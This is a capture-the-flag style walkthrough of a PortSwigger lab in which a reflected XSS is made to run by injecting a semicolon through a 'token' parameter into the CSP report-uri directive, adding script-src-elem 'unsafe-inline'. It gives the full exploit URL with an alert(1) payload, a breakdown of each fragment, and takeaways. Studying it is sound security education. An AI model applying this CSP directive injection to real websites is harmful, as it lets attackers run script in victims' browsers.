# Lab 29: Reflected XSS protected by CSP, with CSP bypass

**Category:** Cross-Site Scripting (XSS)
**Difficulty:** Practitioner
**Lab link:** [Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

> **Browser note:** The intended solution works only in Chrome. Firefox parses CSP differently and will block the payload.

## Overview

The search endpoint reflects `search` into HTML (classic XSS), but a CSP blocks inline scripts. The flaw is in how the policy is built: the server reflects the `token` query parameter inside the CSP's **`report-uri`** directive. Injecting a `;` ends `report-uri` and lets us append a whole new directive — `script-src-elem 'unsafe-inline'` — which overrides `script-src` for `<script>` elements and permits the reflected inline script.

## Key Concepts

- **CSP directive injection:** when any CSP directive is built from untrusted input, a `;` lets you terminate it and add new directives. `report-uri` is a common sink because its value is often a URL template that mixes in request data.
- **`script-src-elem` beats `script-src` for `<script>` tags:** CSP Level 3 splits `script-src` into `script-src-elem` (applies to `<script>` elements) and `script-src-attr` (applies to inline event handlers). If `script-src-elem` is present, it takes precedence for script elements.
- **`'unsafe-inline'` reopens inline script execution** even when the original policy forbade it.

## Solution

Visit this URL (replace `LAB-ID`):

```
https://LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

URL-encoded (safe to paste into the address bar):

```
https://LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

Opening the URL in **Chrome** fires `alert(1)` and solves the lab.

## Payload Breakdown

| Fragment | Purpose |
|----------|---------|
| `search=<script>alert(1)</script>` | The reflected XSS payload. |
| `&token=` | Starts the token value that gets reflected into `report-uri`. |
| `;` | Ends the `report-uri` directive early. |
| `script-src-elem 'unsafe-inline'` | A new directive appended to the CSP header. Overrides `script-src` for `<script>` elements and allows inline scripts. |

The resulting CSP header looks roughly like:

```
Content-Security-Policy: ...; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

Chrome parses the second `;` as a directive separator, sees `script-src-elem 'unsafe-inline'`, and happily runs the inline `<script>`.

## How to Confirm the Bug Yourself

1. Send `?search=<script>alert(1)</script>` → see the CSP header in the response. The policy forbids inline scripts, so the alert never fires.
2. Add `?token=xyz`. Inspect the response's `Content-Security-Policy` header — you'll find `xyz` sitting inside `report-uri`.
3. That reflection means you can smuggle a `;` and tack on your own directive. The lab is solved by one carefully placed semicolon.

## Key Takeaways

- **Every CSP directive built from user input is a bypass primitive.** `report-uri`, `nonce`, host sources, hashes — if the attacker can influence any of them, the whole policy is suspect.
- **CSP Level 3 added more directives, and more directives = more precedence rules to confuse the author.** Knowing that `script-src-elem` beats `script-src` for `<script>` tags turns a defence-in-depth header into an open door.
- **Chrome and Firefox do not parse CSP identically.** Browser-specific bypasses are common; always test exploit assumptions in the target browser.
- **The underlying bug is the reflected XSS.** CSP is a last line of defence — once the policy is bypassable, you're back to a vanilla `<script>alert(1)</script>`.
